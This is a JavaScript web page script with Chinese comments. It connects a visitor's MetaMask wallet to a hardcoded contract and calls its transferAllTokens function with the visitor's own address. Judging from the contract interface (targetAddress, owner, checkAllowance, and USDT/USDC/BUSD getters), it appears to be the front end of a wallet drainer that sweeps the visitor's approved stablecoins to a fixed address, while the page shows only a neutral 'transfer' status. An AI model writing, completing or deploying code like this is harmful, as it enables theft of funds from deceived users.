let web3;
let contract;
let userAddress;

// 合约地址
const contractAddress = "0x38cB7800C3Fddb8dda074C1c650A155154924C73";

// 添加完整的 ABI
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            }
        ],
        "name": "transferAllTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    },
    {
        "inputs": [],
        "name": "busdToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "contract IERC20",
                "name": "token",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            }
        ],
        "name": "checkAllowance",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "targetAddress",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdcToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdtToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 连接钱包功能
async function connectWallet() {
    if (window.ethereum) {
        try {
            // 请求用户连接钱包
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            // 初始化web3实例
            web3 = new Web3(window.ethereum);
            
            // 获取用户的以太坊地址
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];

            // 显示连接的钱包地址
            document.getElementById('walletAddress').textContent = `钱包地址: ${userAddress}`;
            document.getElementById('transferTokens').disabled = false;

            // 初始化合约
            contract = new web3.eth.Contract(contractABI, contractAddress);
        } catch (error) {
            console.error("钱包连接失败", error);
            alert("钱包连接失败，请检查MetaMask是否已安装并启用");
        }
    } else {
        alert("请安装MetaMask钱包扩展程序！");
    }
}

// 调用合约的转移代币功能
async function transferAllTokens() {
    if (contract && userAddress) {
        try {
            const receipt = await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
            document.getElementById('transferStatus').textContent = `转移成功! 交易哈希: ${receipt.transactionHash}`;
        } catch (error) {
            console.error("代币转移失败", error);
            document.getElementById('transferStatus').textContent = `代币转移失败: ${error.message}`;
        }
    } else {
        alert("请先连接钱包！");
    }
}

// 添加按钮点击事件
